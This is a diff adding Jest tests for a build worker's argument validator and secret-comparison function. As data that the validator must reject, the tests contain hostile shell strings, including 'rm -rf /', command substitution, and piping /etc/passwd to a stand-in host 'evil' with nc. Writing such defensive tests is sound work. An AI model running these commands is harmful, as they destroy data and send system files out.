@@ -178,6 +178,30 @@ describe("Worker", () => {
         expect(safe).toBe(true);
     });
 
+    test('isArgumentSafe accepts legitimate build arguments', () => {
+        expect(w.isArgumentSafe("--git=https://github.com/owner/repo.git")).toBe(true);
+        expect(w.isArgumentSafe("--branch=main")).toBe(true);
+        expect(w.isArgumentSafe("./builder --owner=mock --build_id=abc-123")).toBe(true);
+    });
+
+    test('isArgumentSafe rejects shell metacharacters', () => {
+        expect(w.isArgumentSafe("echo hello; rm -rf /")).toBe(false);
+        expect(w.isArgumentSafe("echo hello && whoami")).toBe(false);
+        expect(w.isArgumentSafe("echo `whoami`")).toBe(false);
+        expect(w.isArgumentSafe("echo $(whoami)")).toBe(false);
+        expect(w.isArgumentSafe("cat /etc/passwd | nc evil 1234")).toBe(false);
+        expect(w.isArgumentSafe("echo hi > /tmp/x")).toBe(false);
+        expect(w.isArgumentSafe(undefined)).toBe(false);
+    });
+
+    test('secretsMatch is exact and rejects prefixes', () => {
+        expect(w.secretsMatch("s3cr3t", "s3cr3t")).toBe(true);
+        expect(w.secretsMatch("s3cr3t-extra", "s3cr3t")).toBe(false); // prefix must NOT pass
+        expect(w.secretsMatch("s3cr3", "s3cr3t")).toBe(false);
+        expect(w.secretsMatch("wrong", "s3cr3t")).toBe(false);
+        expect(w.secretsMatch(null, "s3cr3t")).toBe(false);
+    });
+
     test ('runShell', (done) => {
         w.runShell(CMD, owner, build_id, udid, path, io, () => {
             done();
